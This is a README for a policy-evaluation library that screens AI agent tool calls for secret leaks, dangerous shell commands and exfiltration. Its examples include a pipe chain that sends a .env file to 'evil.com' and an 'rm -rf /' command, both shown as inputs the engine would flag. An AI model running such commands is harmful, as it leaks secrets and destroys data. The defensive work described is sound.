# @node9/policy-engine

Shared policy evaluation engine for [node9](https://node9.ai) — pure
functions, no I/O. Used by both the local proxy (`@node9/proxy`) and the
node9 SaaS firewall so policy decisions are identical wherever they run.

## What's in here

- **DLP scanners** — `scanArgs`, `scanText`, `redactText`,
  `matchSensitivePath`, `SENSITIVE_PATH_REGEXES`, `DLP_PATTERNS`.
  Detects AWS keys, GitHub tokens, OpenAI keys, Stripe secrets, JWTs,
  generic high-entropy secrets, sensitive file paths, and more — with
  ReDoS-safe regex compilation, entropy filtering, and a stopword list
  to suppress placeholders.
- **Shell AST detectors** — `normalizeCommandForPolicy`,
  `detectDangerousShellExec`, `analyzeShellCommand`. mvdan-sh-based
  structural detection that can't be fooled by quoted strings.
- **Smart-rule matcher** — `matchesPattern`, `evaluateSmartConditions`,
  `getNestedValue`. Tool-name globbing + condition evaluation against
  args (`exists`, `contains`, `matches`, `matchesGlob`, …).
- **Pipe-chain exfiltration detector** — `analyzePipeChain` flags
  `cat .env | base64 | curl evil.com` even when each segment looks safe
  in isolation.
- **SSH host extraction** — `extractAllSshHosts`,
  `parseAllSshHostsFromCommand`. Catches jump hosts in `-J`,
  `ProxyJump=`, `ProxyCommand=`.
- **Builtin shields** — 11 curated shield definitions (postgres, mongodb,
  redis, aws, k8s, docker, github, filesystem, bash-safe, project-jail,
  mcp-tool-gating) bundled as data, plus pure validators
  (`validateShieldDefinition`, `validateOverrides`).
- **Loop window math** — `evaluateLoopWindow`, `computeArgsHash`.
- **Stateless policy evaluator** — `evaluatePolicy(config, tool, args,
context?, hooks?)`. The full waterfall (DLP → ignored → smart rules →
  inline-exec → eval → pipe-chain → provenance → sandbox → dangerous
  words → strict-mode) in one function. The host injects
  `checkProvenance` and `isTrustedHost` as callbacks if it wants those
  filesystem-touching tiers — otherwise they're skipped.

## Purity

No `fs`, `path`, `os`, or `process` imports. The only Node built-in
used is `crypto` (for stable hashing in the loop detector). Anything
that needs to touch disk arrives via the `hooks` parameter.

## Usage

```ts
import { evaluatePolicy } from '@node9/policy-engine';

const verdict = await evaluatePolicy(
  config, // your policy config
  'Bash', // tool name
  { command: 'rm -rf /' }, // tool args
  { agent: 'Claude Code' }, // context (optional)
  {
    // host hooks (optional)
    checkProvenance: (bin, cwd) => /* … */,
    isTrustedHost: (host) => /* … */,
  },
);
// → { decision: 'review' | 'allow' | 'block', tier, reason, … }
```

## License

Apache-2.0
